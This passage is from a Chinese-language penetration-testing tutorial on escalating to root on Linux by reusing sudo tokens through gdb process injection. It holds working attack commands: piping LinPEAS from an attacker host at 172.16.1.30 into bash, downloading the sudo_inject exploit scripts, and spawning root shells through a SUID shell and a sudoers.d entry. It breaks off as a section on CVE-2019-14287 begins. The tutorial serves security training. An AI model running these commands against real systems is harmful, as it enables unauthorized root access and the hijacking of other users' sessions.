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" width="647" height="47" class="img_ev3q"></p>
<p>Great！在这里我们可以看到它被设置为“0”，这意味着它已完全启用。</p>
<p>接下来，我们需要检查受害主机上是否安装了<strong>gdb 。</strong></p>
<p>为此，我们只需尝试运行命令<strong>gdb</strong>即可。如果我们进入<strong>gdb</strong>提示符，那么我们就知道它已安装并且可以访问（在我们的 PATH 中）。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030923-1004088378-b808c50ac91aeb4e9cb168676218e2cf.png" width="635" height="271" class="img_ev3q"></p>
<p>最后，我们需要查找当前用户拥有的 &quot;shell &quot;进程。如果找到了，我们就可以尝试注入它们，看看是否有 sudo 令牌。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ps -ef | grep &quot;bash\|sh&quot; | grep -i &quot;jugger&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030913-1190988355-e82686c58d050b3fd0c6363c76ccc911.png" width="945" height="125" class="img_ev3q"></p>
<p>这表明我们当前用户拥有两个<strong>bash进程：439 和 2516</strong></p>
<p>其中一个进程是我们当前的 shell，可能是 PID 较高的那个。然而，另一个进程（439）的所有者是系统中的实际用户，他们像往常一样工作。</p>
<p>此时，我们可以使用以下命令测试 POC 以查看进程是否可注入（如果用户在过去 15 分钟内从该 shell发出<strong>sudo ）：</strong></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;call system (&quot;echo | sudo -S touch /tmp/juggernaut ; echo | sudo -S chmod 777 /tmp/juggernaut&quot;)&#x27; | gdb -q -n -p &quot;439&quot; &gt;/dev/null 2&gt;&amp;1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果<strong>bash</strong>进程中有可用的<strong>sudo</strong>令牌，则会在/tmp目录中创建一个所有者是 root 且命名为 juggernaut 空文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190031152-13335352-3312bdf99ba3ba841834c71de978f6df.png" width="879" height="283" class="img_ev3q"></p>
<p>Amazing！ POC 起作用了，这意味着进程 439 中有一个<strong>sudo令牌。</strong></p>
<p>在我们利用这一点之前，让我们快速检查一下 LinPEAS 在这方面做得如何。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="44自动寻找-sudo-令牌重用条件--linpeas"><strong><div id="id4.4">4.4、自动寻找 Sudo 令牌重用条件 – LinPEAS</div></strong><a href="#44自动寻找-sudo-令牌重用条件--linpeas" class="hash-link" aria-label="44自动寻找-sudo-令牌重用条件--linpeas的直接链接" title="44自动寻找-sudo-令牌重用条件--linpeas的直接链接">​</a></h4>
<p>在本文的第 1 部分中，我们使用 LinPEAS 来枚举<strong>sudo</strong>权限。这次我们将检查它枚举<strong>sudo</strong>令牌重用漏洞的能力。</p>
<p>由于攻击者机器上的 Web 服务器仍在运行，我们可以再次将 LinPEAS 直接下载到内存中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/linpeas.sh | bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190036362-1110374089-98aae68d1c091fb0f5f8c11b2afb0e65.png" width="876" height="400" class="img_ev3q"></p>
<p>检查“User Information“部分，我们可以看到我们当前的用户<strong>juggernaut</strong>位于<strong>sudo</strong>组中，但前提是您知道用户密码。</p>
<p>此外，这次执行令牌检查时，发现了可重用的<strong>sudo令牌。</strong></p>
<p>LinPEAS 自动完成了我们所做的一切。首先，它检查 ptrace 是否设置为 0（完全启用）。接下来，它会找到 shell 进程并尝试注入它们，就像我们为 POC 所做的那样。最后，它表明<strong>sudo</strong>令牌在该过程中是可重用的，因为它能够创建文件，就像我们手动创建的文件一样。</p>
<p>如果我们检查/tmp文件夹，应该有一个所有者是 root 且命名为<strong>shrndom32r2r</strong>的空文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030415-704110072-3a997e2f73746bc991950184bac145ff.png" width="580" height="141" class="img_ev3q"></p>
<p>Perfect！ LinPEAS 在枚举<strong>sudo</strong>令牌重用漏洞方面做得非常出色。</p>
<blockquote>
<p>对于此漏洞，您可能不会手动枚举它。您很可能会从 LinPEAS 输出中找到它。但是，如果您发现除 POC 之外的所有内容都失败了，则可以设置一个循环以每 5 分钟测试一次注入，直到成功。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="45利用-sudo-令牌重用"><strong><div id="id4.5">4.5、利用 Sudo 令牌重用</div></strong><a href="#45利用-sudo-令牌重用" class="hash-link" aria-label="45利用-sudo-令牌重用的直接链接" title="45利用-sudo-令牌重用的直接链接">​</a></h4>
<p>要利用<strong>sudo</strong>令牌重用，我们需要前往<a href="https://github.com/nongiach/sudo_inject" target="_blank" rel="noopener noreferrer">此处</a>的 GitHub 页面来获取漏洞。</p>
<p>在 GitHub 存储库上，我们将找到三个可以测试的脚本。如果其中一个失败，那么我们将继续进行下一个，直到获得 root shell。</p>
<p>首先，我们需要将整个存储库克隆到攻击者计算机上，然后将要传输给受害者的文件复制到我们的工作目录中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/nongiach/sudo_inject.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd sudo_inject</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp exploit* /your/working/directory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp activate_sudo_token /your/working/directory</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190031438-1112211786-662d81e40c5f0e8d35bdd63076fefd16.png" width="547" height="524" class="img_ev3q"></p>
<p>接下来，我们需要将每个脚本的副本以及二进制<strong>activate_sudo_token</strong>传输到受害计算机。</p>
<p>为此，我们可以从工作目录中启动一个快速的 Web 服务器，然后将所有文件下载到受害者上。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m http.server 80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>接下来，我们可以在受害者计算机上下载所有四个文件，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/exploit.sh -o /tmp/exploit.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/exploit_v2.sh -o /tmp/exploit_v2.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/exploit_v3.sh -o /tmp/exploit_v3.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/activate_sudo_token -o /tmp/activate_sudo_token</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030949-1281161361-3b1eb57145bfab96c56873d7f36385f6.png" width="811" height="268" class="img_ev3q"></p>
<p>将所有文件下载到受害者后，我们需要授予所有文件执行权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 /tmp/exploit* ; chmod 755 activate_sudo_token</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030962-1296746556-8499c41600c05027acf688b1567745ac.png" width="740" height="154" class="img_ev3q"></p>
<p>完美的！一切准备就绪，开始测试。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="451exploitsh"><strong><div id="id4.5.1">4.5.1、exploit.sh</div></strong><a href="#451exploitsh" class="hash-link" aria-label="451exploitsh的直接链接" title="451exploitsh的直接链接">​</a></h6>
<p>如果我们检查第一个脚本，我们可以看到它创建了一个无效的<strong>sudo</strong>条目，用令牌注入<strong>activate_sudo_token</strong>二进制文件（如果存在），然后将令牌激活到我们当前的会话中。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190031025-1596439562-3c981174297bcdce603a6e84cfae2370.png" width="872" height="271" class="img_ev3q"></p>
<blockquote>
<p>为了让漏洞发挥作用，将<strong>exploit.sh</strong>和<strong>activate_sudo_token</strong>放在同一目录中非常重要。</p>
</blockquote>
<p>让我们测试一下...</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/exploit.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030772-1094684344-dd5633f3ced7a8465d9a492e062ab475.png" width="609" height="110" class="img_ev3q"></p>
<p>这里我们可以看到进程<strong>439</strong>被注入，这意味着令牌应该已经成功激活到我们当前的会话中。</p>
<p>为了测试它是否有效，我们所要做的就是运行<strong>sudo su</strong>并希望我们进入 root shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030338-1505845671-c500dfb5c18c968efaf5f2464f107e50.png" width="357" height="78" class="img_ev3q"></p>
<p>Amazing！我们成功窃取了实时<strong>sudo</strong>令牌，这使我们能够以 root 身份运行任何我们想要的命令！</p>
<blockquote>
<p>如果由于某种原因运行<strong>sudo su</strong>没有让您进入 root shell，您可以尝试通过执行<strong>activate_sudo_token</strong>来手动激活 sudo 令牌。</p>
</blockquote>
<p>或者，如果exploit.sh 无法工作，我们需要继续尝试<strong>exploit_v2.sh</strong>。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="452exploit_v2sh"><strong><div id="id4.5.2">4.5.2、exploit_v2.sh</div></strong><a href="#452exploit_v2sh" class="hash-link" aria-label="452exploit_v2sh的直接链接" title="452exploit_v2sh的直接链接">​</a></h6>
<p>让我们看看第二个漏洞的作用。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030898-191398472-da4b3af78b8197a805478ef18d3ef913.png" width="873" height="237" class="img_ev3q"></p>
<p>与上一个漏洞类似，此漏洞注入 shell 进程以重用<strong>sudo</strong>令牌。但是，此漏洞利用令牌将sh复制到/tmp文件夹中，然后设置 SUID 位，而不是将令牌注入<strong>activate_sudo_token</strong>二进制文件并启用完整的<strong>sudo权限。</strong></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/exploit_v2.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190031384-1228697307-af7d9c4200e0d0e986bb32c442c65e0d.png" width="605" height="303" class="img_ev3q"></p>
<p>Great！在这里我们可以看到漏洞利用有效并成功地重用了令牌。</p>
<p>现在我们需要做的就是执行 SUID <strong>sh</strong>文件并进入 root shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/sh -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030788-1783150853-670dc5a6a6318ccb29a36bfa977abcf5.png" width="873" height="92" class="img_ev3q"></p>
<p>Awesome！另一个root shell ！但是，如果这也不起作用怎么办？如果发生这种情况，我们需要继续测试<strong>exploit_v3.sh</strong>。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="453exploit_v3sh"><strong><div id="id4.5.3">4.5.3、exploit_v3.sh</div></strong><a href="#453exploit_v3sh" class="hash-link" aria-label="453exploit_v3sh的直接链接" title="453exploit_v3sh的直接链接">​</a></h6>
<p>最后，让我们快速浏览一下第三个漏洞，看看它做了什么。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190032892-752505104-311c88078f9823ddb28bbaed8c0b95ce.png" width="744" height="303" class="img_ev3q"></p>
<p>此漏洞利用会创建一个有效负载，该有效负载可全局启用<strong>sudo</strong>并将令牌计时器设置为无限期运行。创建有效负载后，该漏洞会将有效负载注入到sudoers.d目录中名为win的文件中。最后，执行<strong>sudo -i</strong>以进入 root shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/exploit_v3.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030835-602904857-3da12cf5f70f71e2f4c8e0db12b51abe.png" width="441" height="125" class="img_ev3q"></p>
<p>Awesome！令牌被重用并直接将我们带入 root shell！</p>
<p>现在我们已经广泛讨论了令牌重用，让我们将重点转移到影响不同版本的<strong>sudo</strong>二进制自身的漏洞利用上。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5利用-sudo-命令--sudo-版本-1827-cve-2019-14287"><strong><div id="id5">5、利用 Sudo 命令 – Sudo 版本 ≤1.8.27 (CVE-2019-14287)</div></strong><a href="#5利用-sudo-命令--sudo-版本-1827-cve-2019-14287" class="hash-link" aria-label="5利用-sudo-命令--sudo-版本-1827-cve-2019-14287的直接链接" title="5利用-sudo-命令--sudo-版本-1827-cve-2019-14287的直接链接">​</a></h2>
<blockquote>
<p>对于最后两个示例，我们将以用户cain返回 shell 。</p>
</blockquote>
<p>正如本文第 1 部分所述，<strong>sudo</strong> 是一个程序（二进制），这意味着它由于多次升级/更新而具有多个版本。这意味着 <strong>sudo</strong>的某些版本可能 具有公共漏洞和分配给它们的 CVE。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="51枚举-sudo-的版本"><strong><div id="id5.1">5.1、枚举 Sudo 的版本</div></strong><a href="#51枚举-sudo-的版本" class="hash-link" aria-label="51枚举-sudo-的版本的直接链接" title="51枚举-sudo-的版本的直接链接">​</a></h4>
<p>获得立足点后需要检查的一件重要事情是受害主机上正在运行哪个版本的<strong>sudo 。</strong></p>
<p>我们可以使用以下命令检查受害者上运行的<strong>sudo</strong>版本：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo -V</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 